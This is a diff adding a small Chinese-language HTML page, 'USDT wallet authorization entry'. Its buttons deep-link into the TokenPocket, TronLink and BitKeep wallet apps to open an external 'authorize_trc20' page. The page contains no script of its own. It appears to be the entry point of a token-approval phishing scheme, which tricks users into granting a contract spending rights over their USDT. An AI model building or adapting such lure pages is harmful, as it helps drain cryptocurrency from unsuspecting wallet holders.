@@ -1,0 +1,56 @@
+
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+  <meta charset="UTF-8">
+  <title>USDT 钱包授权入口</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+      background: #f7f7f7;
+      padding: 30px;
+      text-align: center;
+    }
+    h2 { margin-bottom: 30px; }
+    .wallet-btn {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 15px auto;
+      padding: 12px 16px;
+      width: 85%;
+      max-width: 320px;
+      font-size: 17px;
+      border-radius: 8px;
+      color: #fff;
+      text-decoration: none;
+    }
+    .tp { background: #2b6def; }
+    .tronlink { background: #003399; }
+    .bitkeep { background: #26d07c; }
+    .wallet-btn img {
+      width: 24px;
+      height: 24px;
+      margin-right: 10px;
+    }
+  </style>
+</head>
+<body>
+  <h2>请选择钱包进行授权</h2>
+
+  <a class="wallet-btn tp" href="tpdapp://open?url=https%3A%2F%2Forder-demo-one.vercel.app%2Fauthorize_trc20.html">
+    <img src="https://img.icons8.com/color/48/000000/token-pocket.png"/> TokenPocket
+  </a>
+
+  <a class="wallet-btn tronlink" href="tronlink://dapp?url=https%3A%2F%2Forder-demo-one.vercel.app%2Fauthorize_trc20.html">
+    <img src="https://img.icons8.com/color/48/000000/tron.png"/> TronLink
+  </a>
+
+  <a class="wallet-btn bitkeep" href="bitkeep://dapp?url=https%3A%2F%2Forder-demo-one.vercel.app%2Fauthorize_trc20.html">
+    <img src="https://img.icons8.com/color/48/000000/wallet.png"/> BitKeep / Bitget
+  </a>
+
+  <p style="margin-top: 30px; color: #555;">请确保手机已安装对应钱包</p>
+</body>
+</html>
